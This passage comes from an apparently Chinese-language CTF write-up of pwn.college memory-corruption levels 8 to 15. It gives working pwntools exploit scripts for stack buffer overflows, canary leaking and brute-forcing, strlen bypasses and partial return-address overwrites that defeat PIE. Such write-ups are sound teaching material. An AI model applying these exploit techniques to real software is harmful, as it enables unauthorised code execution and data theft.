class="hljs-literal">True</span>:	<span class="hljs-comment"># 通过不断循环来爆破</span><br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval+<span class="hljs-number">8</span>))<span class="hljs-comment">#这里加上了 push rbp</span><br>    payload = interval * <span class="hljs-string">b&#x27;A&#x27;</span> + p8(<span class="hljs-number">0xe5</span>) + p8(random.choice(table) + <span class="hljs-number">0x9</span>) <span class="hljs-comment">#这里注意需要绕过长度检测，不是从函数一开始跳转的</span><br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h2 id="level-8-2"><a class="markdownIt-Anchor" href="#level-8-2"></a> level 8</h2>
<blockquote>
<p>增加对于payload的长度检测，它通过read读取payload，然后strlen()来计算，由于strlen()通过’\x00’来计算长度，所以可以在payload最开始加上 ‘\x00’ 来绕过strlen()的长度检测</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x60</span><br>table = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-number">0x10</span>):<br>    table.append(i)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval+<span class="hljs-number">8</span>))<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + (interval - <span class="hljs-number">1</span>) * <span class="hljs-string">b&#x27;A&#x27;</span> + p8(<span class="hljs-number">0xb7</span>) + p8(random.choice(table) + <span class="hljs-number">0x5</span>)<br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h2 id="level-9-2"><a class="markdownIt-Anchor" href="#level-9-2"></a> level 9</h2>
<blockquote>
<p>开启了 Canary和PIE，需要绕过这两个</p>
</blockquote>
<p>​	对于 canary，它是从内存中某处(一般为fs:0x28–x64的)复制一个随机数canary，该随机数会在创建栈帧时紧跟着 <strong>rbp</strong> 入栈。如下图所示 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/613650807">参考: CTFer成长日记13：Canary的基本原理与绕过 - 知乎 (zhihu.com)</a></p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402171204504.png" srcset="/img/loading.gif" lazyload alt="image-20240217120423364" /></p>
<p>​	这里绕过cannary的方式就是使用一个存储字节 n 来进行绕过。程序通过一个字节读来实现数据的读取，但如果这里覆盖了 n 的值，修改为指向返回地址，那么这里读取的数据将直接覆盖到返回地址上，实现了对于 cannary 的绕过。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (n &lt; size) <br>&#123;<br>    n += read(<span class="hljs-number">0</span>, input + n, <span class="hljs-number">1</span>);    <br>&#125;<br></code></pre></td></tr></table></figure>
<p>​	根据ida中信息分析，input的位置在 <code>[rbp-40h]</code> ，而 n 的位置在 <code>[rbp-18h]</code> 中间相差40bytes，所以之后需要填补这些数据后覆盖n，之后就是正常的绕过 PIE 操作。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">__int64 input[5]; // [rsp+40h] [rbp-40h] BYREF<br>int n; // [rsp+68h] [rbp-18h] BYREF<br><br>+---------------------------------+-------------------------+--------------------+--------+<br>|                  Stack location |            Data (bytes) |      Data (LE int) |	name  |<br>+---------------------------------+-------------------------+--------------------+--------+<br>| 0x00007ffe8aa0b840 (rsp+0x0040) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 | input  |<br>| 0x00007ffe8aa0b848 (rsp+0x0048) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |		  |<br>| 0x00007ffe8aa0b850 (rsp+0x0050) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |        |<br>| 0x00007ffe8aa0b858 (rsp+0x0058) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |        |<br>| 0x00007ffe8aa0b860 (rsp+0x0060) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |        |<br>| 0x00007ffe8aa0b868 (rsp+0x0068) | 4a 00 00 00 fe 7f 00 00 | 0x00007ffe0000004a |n(4byte)|<br>| 0x00007ffe8aa0b870 (rsp+0x0070) | 00 d2 59 e0 00 56 00 00 | 0x00005600e059d200 |        |<br>| 0x00007ffe8aa0b878 (rsp+0x0078) | 00 ec cc 6e 14 e6 e5 8b | 0x8be5e6146eccec00 | canary |<br>| 0x00007ffe8aa0b880 (rsp+0x0080) | c0 c8 a0 8a fe 7f 00 00 | 0x00007ffe8aa0c8c0 |push rbp|<br>| 0x00007ffe8aa0b888 (rsp+0x0088) | 11 22 59 e0 00 56 00 00 | 0x00005600e0592211 | return |<br>+---------------------------------+-------------------------+--------------------+--------+<br></code></pre></td></tr></table></figure>
<p>​	这是脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x40</span> <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval+<span class="hljs-number">8</span>+<span class="hljs-number">2</span>))<span class="hljs-comment"># 算上push rbp与返回地址的2个字节填充</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <span class="hljs-comment"># input与n之间的差值</span><br>        r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>        r.send(p8(<span class="hljs-number">0x48</span>)) <span class="hljs-comment"># input到return的距离，intercal+8</span><br>    r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>    r.send(p8(<span class="hljs-number">0x47</span>))	<span class="hljs-comment"># 这里是要跳转的，因为再下一次之前，它会读取一个字节并加1，所以覆盖n需要先距离-1</span><br>    r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>    r.send(p8(<span class="hljs-number">0x2b</span>))<br>    r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>    r.send(p8(<span class="hljs-number">0x22</span>))<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
<p>​	9.1没有回显，需要删除 <code>r.recvuntil('bytes away from the start of the input buffer.')</code>。</p>
<h2 id="level-10"><a class="markdownIt-Anchor" href="#level-10"></a> level 10</h2>
<blockquote>
<p>被别人的思路误导了，这里只需要注意字符串是以’\x00’截断，然后利用printf即可</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"># 主要就是下面的语句<br><span class="hljs-type">char</span> v13[<span class="hljs-number">320</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-150h] BYREF</span><br>v11 = v13;<br>buf = &amp;v13[<span class="hljs-number">0x43</span>];			<span class="hljs-comment">// 这里就是首先读取flag到input的一个地方，然后再从头输入input</span><br>v3 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);		<br>read(v3, buf, <span class="hljs-number">0x100</span>uLL);	<span class="hljs-comment">// 设置flag到栈中</span><br>v9 = read(<span class="hljs-number">0</span>, v11, nbytes);	<span class="hljs-comment">// 读取输入</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)v11);	<span class="hljs-comment">//主要利用printf打印，将v13中前0x43字符填充，防止&#x27;\x00&#x27;截断，然后打印会顺带把flag带出来</span><br></code></pre></td></tr></table></figure>
<p>​	脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x43</span> <br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * interval <br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-11"><a class="markdownIt-Anchor" href="#level-11"></a> level 11</h2>
<blockquote>
<p>en……直接覆盖mmap到flag那一页就可以了，没有料到就这样发送大量数据就行</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x8000</span> <br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * interval <br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-12-2"><a class="markdownIt-Anchor" href="#level-12-2"></a> level 12</h2>
<blockquote>
<p>经典的 canary 的绕过方式，两次read，第一次通过printf来泄露，第二次获得flag</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    interval = <span class="hljs-number">0x40</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span>	<span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1</span><br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>) <span class="hljs-comment"># 满足buffer的要求</span><br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>    text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]	<span class="hljs-comment"># 获得canary的值</span><br>    log.info(<span class="hljs-built_in">list</span>(canary))<br>    <span class="hljs-comment"># 进入Backdoor后，即第二次</span><br>    interval = <span class="hljs-number">0x40</span> + <span class="hljs-number">8</span> + <span class="hljs-number">2</span> <span class="hljs-comment"># 增加覆盖rbp与return的后两个字节(PIE)</span><br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (interval - <span class="hljs-number">18</span>) + canary +  <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8</span> + p8(<span class="hljs-number">0xCA</span>) + p8(<span class="hljs-number">0x18</span>) <span class="hljs-comment"># -18是后面添加的东西，中间是canary与rbp，最后是win_authed需要的</span><br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h2 id="level-13-2"><a class="markdownIt-Anchor" href="#level-13-2"></a> level 13</h2>
<blockquote>
<p>跟 level 10 类似，只需要把栈中flag以前的数据覆盖了即可。但是深层次的原因是上一个函数读取flag到栈中，然后栈上数据没有清理，导致后面的函数可以构造填充使用printf访问</p>
</blockquote>
<p>​	主要就是栈中数据没有清除，这里分析两个函数调用的关键局部变量。它们之间的差值(0x1B8-0x110=0x99)就是需要填充的多余数据，然后printf会在打印输入中把flag也顺带出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD v2[<span class="hljs-number">34</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF		# 这里是verify_flag中保存flag的数组</span><br><span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-1B8h]					# 这里是input的数组</span><br></code></pre></td></tr></table></figure>
<p>​	脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br>r = process(binary_paths)<br>interval = <span class="hljs-number">0x99</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * interval<br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-14-2"><a class="markdownIt-Anchor" href="#level-14-2"></a> level 14</h2>
<blockquote>
<p>与 level 12 类似，同时这里的printf对于输出长度存在限制，这个限制导致不能直接泄露出canary，但是level 12对buf进行了memset操作，而level 14没有，所以可以用之前没有置零的数据来找到程序的canary–&gt;这里感觉像是每个函数的canary都是一样的，所以可以这样使用</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    interval = <span class="hljs-number">0x88</span> + <span class="hljs-number">1</span>	<span class="hljs-comment"># 不会算，直接gdb调试出来的，感觉不太对，但目前只能这样了</span><br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>) <br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>    text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<br>    log.info(<span class="hljs-built_in">list</span>(canary))<br>    <span class="hljs-comment"># 进入Backdoor后，即第二次</span><br>    interval = <span class="hljs-number">0x1A0</span> + <span class="hljs-number">8</span> + <span class="hljs-number">2</span>	<span class="hljs-comment"># 正常的覆盖返回地址</span><br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (interval - <span class="hljs-number">18</span>) + canary +  <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8</span> + p8(<span class="hljs-number">0x3A</span>) + p8(<span class="hljs-number">0x17</span>)<br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    <span class="hljs-comment"># r.interactive()</span><br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h2 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> level 15</h2>
<blockquote>
<p>这里就是爆破canary，首先注意远程使用r.clean(0.1)，r.recvall()会获取全部输出，将阻塞线程，其次注意增加terminal的显示大小，否则看不到flag了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> random<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br><br>offset_to_canary = <span class="hljs-number">0x60</span> - <span class="hljs-number">8</span>  <span class="hljs-comment"># 删除canary的大小</span><br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">global</span> canary<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):	<span class="hljs-comment"># 从后往前爆破速度快一些</span><br>        r = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">1337</span>)<br>        r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(offset_to_canary + <span class="hljs-number">1</span> + index))	<span class="hljs-comment"># 确定canary最后一位为&#x27;\x00&#x27;了，所以 +1 跳过这一个</span><br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_canary + canary + p8(j)<br>        r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>, payload)<br>        res = r.clean(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:	<span class="hljs-comment"># canary不对会返回 stack smashing detected ，利用这个来判断是否爆破成功</span><br>            canary += p8(j)<br>            log.success(<span class="hljs-string">f&quot;The jth position of canary is <span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):	<span class="hljs-comment"># 7个数据</span><br>        leak_canary(i)<br>    log.success(<span class="hljs-string">f&quot;The canary is <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(canary)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):		<span class="hljs-comment"># 本地启动的进程，数据已经确定，所以最后一个字节需要爆破自己的，而不是爆破程序</span><br>        r = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>        r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(offset_to_canary + <span class="hljs-number">8</span> + <span class="hljs-number">8</span> + <span class="hljs-number">2</span>))<br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_canary + canary + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p16(i &lt;&lt; <span class="hljs-number">12</span> | <span class="hljs-number">0xA28</span>)<br>        r.sendafter(<span class="hljs-string">&quot;bytes)!&quot;</span>, payload)<br>        res = r.clean(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> res:<br>            log.success(res)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure>
<h1 id="program-exploitation"><a class="markdownIt-Anchor" href="#program-exploitation"></a> Program Exploitation</h1>
<h2 id="基础知识-4"><a class="markdownIt-Anchor" href="#基础知识-4"></a> 基础知识</h2>
<h3 id="gcc的编译选项"><a class="markdownIt-Anchor" href="#gcc的编译选项"></a> gcc的编译选项</h3>
<ul>
<li>
<p>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭/开启)  不让执行栈上的数据，于是JMP ESP就不能用了</p>
</li>
<li>
<p>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭/开启/全开启) 栈里插入cookie信息</p>
</li>
<li>
<p>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭/开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></p>
</li>
<li>
<p>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭/部分开启/完全开启) 对GOT表具有写权限</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tabactivity/article/details/126660974">具体说明</a></p>
</li>
</ul>
